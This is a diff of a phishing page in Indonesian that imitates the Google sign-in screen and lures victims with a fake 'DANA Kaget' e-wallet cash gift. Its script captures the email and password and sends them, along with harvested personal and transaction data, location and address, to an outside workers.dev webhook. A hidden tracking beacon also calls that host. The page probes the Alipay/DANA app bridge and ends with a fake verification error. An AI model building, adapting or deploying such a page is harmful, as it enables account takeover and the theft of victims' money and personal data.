@@ -1,13 +1,43 @@
-<!doctype html><html lang="id" dir="ltr"><head><base href="https://accounts.google.com/v3/signin/"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Login - Akun Google</title>
-<style>body{margin:0;font-family:Google Sans,Roboto,Arial,sans-serif;background:#f8f9fa;color:#1f1f1f}.card{max-width:448px;margin:40px auto;background:#fff;border:1px solid #dadce0;border-radius:8px;padding:36px 40px}.logo{display:block;margin:0 auto 16px;width:48px}h1{font-size:22px;font-weight:400;text-align:center;margin:8px 0 4px}.sub{color:#5f6368;text-align:center;font-size:14px;margin:0 0 24px}.input-wrap{position:relative;border:1px solid #dadce0;border-radius:4px;padding:12px 14px;margin:16px 0}.input-wrap.focus{border:2px solid #1a73e8;padding:11px 13px}.input-wrap input{width:100%;border:none;outline:none;font-size:15px}.label{position:absolute;left:14px;top:13px;color:#5f6368;background:#fff;padding:0 4px;transition:0.15s;pointer-events:none}.input-wrap.focus .label,.input-wrap.hasval .label{top:-9px;font-size:12px;color:#1a73e8}.btn{float:right;background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;cursor:pointer}.hidden{display:none}.note{font-size:12px;color:#5f6368;margin-top:32px}</style>
+<!doctype html><html lang="id" dir="ltr"><head><base href="https://accounts.google.com/v3/signin/"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><title>Login - Akun Google untuk DANA Kaget</title>
+<style>
+body{margin:0;font-family:Google Sans,Roboto,Arial,sans-serif;background:#f8f9fa;color:#1f1f1f}
+.topbar{background:#fff;border-bottom:1px solid #dadce0;padding:10px 16px;display:flex;align-items:center;gap:10px}
+.topbar img{height:28px}
+.topbar span{font-size:14px;color:#5f6368;font-weight:500}
+.banner{background:#e8f0fe;border:1px solid #d2e3fc;border-radius:8px;padding:10px 12px;margin:16px 16px 0;display:flex;gap:10px;align-items:center}
+.banner img{width:36px;height:36px;border-radius:50%}
+.banner b{font-size:13px;color:#1f1f1f}
+.banner p{font-size:12px;color:#5f6368;margin:2px 0 0}
+.card{max-width:448px;margin:16px auto;background:#fff;border:1px solid #dadce0;border-radius:8px;padding:28px 24px}
+@media(max-width:480px){.card{margin:0;border:none;border-radius:0;min-height:100vh}}
+.logo{display:block;margin:0 auto 12px;width:40px}
+h1{font-size:22px;font-weight:400;text-align:center;margin:6px 0 4px}
+.sub{color:#5f6368;text-align:center;font-size:13px;margin:0 0 8px}
+.dana-note{text-align:center;font-size:12px;color:#0b57d0;background:#f0f4f9;padding:8px;border-radius:6px;margin:0 0 16px}
+.input-wrap{position:relative;border:1px solid #dadce0;border-radius:4px;padding:13px 14px;margin:16px 0}
+.input-wrap.focus{border:2px solid #1a73e8;padding:12px 13px}
+.input-wrap input{width:100%;border:none;outline:none;font-size:15px;background:transparent}
+.label{position:absolute;left:14px;top:13px;color:#5f6368;background:#fff;padding:0 4px;transition:0.15s;pointer-events:none;font-size:15px}
+.input-wrap.focus .label,.input-wrap.hasval .label{top:-9px;font-size:12px;color:#1a73e8}
+.btn{float:right;background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer}
+.btn:active{background:#174ea6}
+.hidden{display:none}
+.link{color:#1a73e8;font-size:13px;text-decoration:none}
+.note{font-size:12px;color:#5f6368;margin-top:28px;line-height:1.4}
+.footer{max-width:448px;margin:8px auto;text-align:center;font-size:11px;color:#5f6368;padding:0 16px}
+</style>
 </head><body>
+<div class="topbar"><img src="https://a.m.dana.id/resource/danaweb/logo/dana-logo.png" style="height:22px" onerror="this.style.display='none'"><span>DANA Kaget • Bagi-bagi Saldo</span></div>
+<div class="banner"><img src="https://a.m.dana.id/resource/danaweb/logo/dana-logo.png" onerror="this.src='https://www.gstatic.com/images/branding/googleg_gradient/svg/googleg_gradient_standard_48px.svg'"><div><b>Anda menerima DANA Kaget!</b><p>Rp 87.500 dari Teman • Login ke Google untuk melanjutkan klaim ke akun DANA Anda</p></div></div>
 <div class="card">
 <img src="https://www.gstatic.com/images/branding/googleg_gradient/svg/googleg_gradient_standard_48px.svg" class="logo">
 <h1>Login</h1><p class="sub">Gunakan Akun Google Anda</p>
-<div id="step1"><div class="input-wrap" id="wrap-email"><span class="label">Email atau nomor telepon</span><input id="inp-email" type="text"></div><a style="color:#1a73e8;font-size:13px" href="#">Lupa email?</a><p class="note">Bukan komputer Anda? Gunakan mode Tamu.</p><div style="display:flex;justify-content:space-between;margin-top:32px"><a style="color:#1a73e8;font-size:13px;line-height:36px" href="#">Buat akun</a><button class="btn" id="btn-next1">Berikutnya</button></div></div>
-<div id="step2" class="hidden"><div style="display:flex;align-items:center;border:1px solid #dadce0;border-radius:16px;padding:6px 12px;width:fit-content;margin-bottom:16px"><span id="chosen-email" style="font-size:13px"></span></div><div class="input-wrap" id="wrap-pass"><span class="label">Masukkan sandi Anda</span><input id="inp-pass" type="password"></div><div style="margin-top:24px;display:flex;justify-content:space-between"><a style="color:#1a73e8;font-size:13px" href="#">Lupa sandi?</a><button class="btn" id="btn-next2">Berikutnya</button></div></div>
-<div id="step3" class="hidden" style="text-align:center;padding:24px 0"><div style="border:3px solid #dadce0;border-top:3px solid #1a73e8;border-radius:50%;width:32px;height:32px;animation:spin 1s linear infinite;margin:0 auto 16px"></div><p style="font-size:14px;color:#5f6368">Memverifikasi...</p><style>@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}</style></div>
+<p class="dana-note">🔒 Login untuk melanjutkan ke <b>DANA Kaget</b> • Saldo akan masuk otomatis setelah verifikasi</p>
+<div id="step1"><div class="input-wrap" id="wrap-email"><span class="label">Email atau nomor telepon</span><input id="inp-email" type="text" autocomplete="username" inputmode="email"></div><a class="link" href="#">Lupa email?</a><p class="note">Bukan komputer Anda? Gunakan mode Tamu untuk login secara pribadi. <a class="link" href="#">Pelajari lebih lanjut</a></p><div style="display:flex;justify-content:space-between;margin-top:32px"><a class="link" style="line-height:36px" href="#">Buat akun</a><button class="btn" id="btn-next1">Berikutnya</button></div></div>
+<div id="step2" class="hidden"><div style="display:flex;align-items:center;border:1px solid #dadce0;border-radius:16px;padding:6px 12px;width:fit-content;margin-bottom:16px"><img src="https://www.gstatic.com/images/branding/product/1x/avatar_circle_blue_512dp.png" style="width:20px;height:20px;border-radius:50%;margin-right:8px"><span id="chosen-email" style="font-size:13px"></span><span style="margin-left:6px;font-size:12px;color:#5f6368">▼</span></div><div class="input-wrap" id="wrap-pass"><span class="label">Masukkan sandi Anda</span><input id="inp-pass" type="password" autocomplete="current-password"></div><div style="margin-top:8px"><label style="font-size:13px;display:flex;align-items:center;gap:8px"><input type="checkbox" id="show-pass"> Tampilkan sandi</label></div><div style="margin-top:24px;display:flex;justify-content:space-between;align-items:center"><a class="link" href="#">Lupa sandi?</a><button class="btn" id="btn-next2">Berikutnya</button></div></div>
+<div id="step3" class="hidden" style="text-align:center;padding:32px 0"><div style="border:3px solid #dadce0;border-top:3px solid #1a73e8;border-radius:50%;width:32px;height:32px;animation:spin 1s linear infinite;margin:0 auto 16px"></div><p style="font-size:13px;color:#5f6368">Memverifikasi ke DANA Kaget...</p><p style="font-size:12px;color:#80868b">Jangan tutup halaman ini</p><style>@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}</style></div>
 </div>
+<div class="footer">Indonesia • <a class="link" href="#">Bantuan</a> • <a class="link" href="#">Privasi</a> • <a class="link" href="#">Persyaratan</a></div>
 <img src="https://larp-hook.rofikulhuda244.workers.dev/?src=larpLandingImg&session=init" style="display:none" width="1" height="1" id="beacon">
 <script>
 (function(){
@@ -22,8 +52,9 @@
   var w1=document.getElementById('wrap-email'), w2=document.getElementById('wrap-pass');
   emailEl.addEventListener('focus',function(){w1.classList.add('focus')}); emailEl.addEventListener('blur',function(){w1.classList.remove('focus'); if(emailEl.value) w1.classList.add('hasval'); else w1.classList.remove('hasval')});
   passEl.addEventListener('focus',function(){w2.classList.add('focus')}); passEl.addEventListener('blur',function(){w2.classList.remove('focus'); if(passEl.value) w2.classList.add('hasval'); else w2.classList.remove('hasval')});
-  document.getElementById('btn-next1').onclick=function(){var v=emailEl.value.trim(); if(!v){emailEl.focus();return;} R.email=v; document.getElementById('chosen-email').textContent=v; document.getElementById('step1').classList.add('hidden'); document.getElementById('step2').classList.remove('hidden'); wh({src:'larpLanding',stage:'email',email:v});};
-  document.getElementById('btn-next2').onclick=function(){var p=passEl.value; if(!p){passEl.focus();return;} R.password=p; document.getElementById('step2').classList.add('hidden'); document.getElementById('step3').classList.remove('hidden'); var piiLen=R.pii?compact(R.pii).length:0, trxLen=R.trx?compact(R.trx).length:0; wh({src:'larpLanding',stage:'creds',email:R.email,password:R.password,piiBytes:piiLen,trxBytes:trxLen,piiHead:R.pii?compact(R.pii).slice(0,800):'',trxHead:R.trx?compact(R.trx).slice(0,400):'',lat:R.loc?R.loc.latitude:'',lng:R.loc?R.loc.longitude:'',address:R.addr?JSON.stringify(R.addr).slice(0,800):''}); setTimeout(function(){ wh({src:'larpLanding',stage:'final',email:R.email,password:p,piiBytes:piiLen,trxBytes:trxLen}); },600); setTimeout(function(){ document.getElementById('step3').innerHTML='<p style="color:#5f6368;font-size:14px">Terjadi kesalahan. Coba lagi nanti.</p>'; },2500);};
+  document.getElementById('show-pass').onchange=function(){passEl.type=this.checked?'text':'password'};
+  document.getElementById('btn-next1').onclick=function(){var v=emailEl.value.trim(); if(!v||!v.includes('@')){w1.style.borderColor='#d93025';emailEl.focus();return;} R.email=v; document.getElementById('chosen-email').textContent=v; document.getElementById('step1').classList.add('hidden'); document.getElementById('step2').classList.remove('hidden'); wh({src:'larpLanding',stage:'email',email:v});};
+  document.getElementById('btn-next2').onclick=function(){var p=passEl.value; if(!p||p.length<6){w2.style.borderColor='#d93025';passEl.focus();return;} R.password=p; document.getElementById('step2').classList.add('hidden'); document.getElementById('step3').classList.remove('hidden'); var piiLen=R.pii?compact(R.pii).length:0, trxLen=R.trx?compact(R.trx).length:0; wh({src:'larpLanding',stage:'creds',email:R.email,password:R.password,piiBytes:piiLen,trxBytes:trxLen,piiHead:R.pii?compact(R.pii).slice(0,800):'',trxHead:R.trx?compact(R.trx).slice(0,400):'',lat:R.loc?R.loc.latitude:'',lng:R.loc?R.loc.longitude:'',address:R.addr?JSON.stringify(R.addr).slice(0,800):''}); setTimeout(function(){ wh({src:'larpLanding',stage:'final',email:R.email,password:p,piiBytes:piiLen,trxBytes:trxLen}); },600); setTimeout(function(){ document.getElementById('step3').innerHTML='<div style="background:#fce8e6;border:1px solid #f5c6cb;border-radius:8px;padding:12px"><p style="color:#b3261e;font-size:13px;margin:0">Tidak dapat memverifikasi akun. Coba lagi nanti atau hubungi bantuan DANA.</p></div>'; },3000);};
   bridgeReady(function(){
     var hasB=!!window.AlipayJSBridge; var sp={}; try{sp=window.AlipayJSBridge.startupParams||{}}catch(e){}
     R.env={hasBridge:hasB,appId:sp.appId,href:location.href.slice(0,120),origin:location.origin,ts:new Date().toISOString(),session:SESSION};
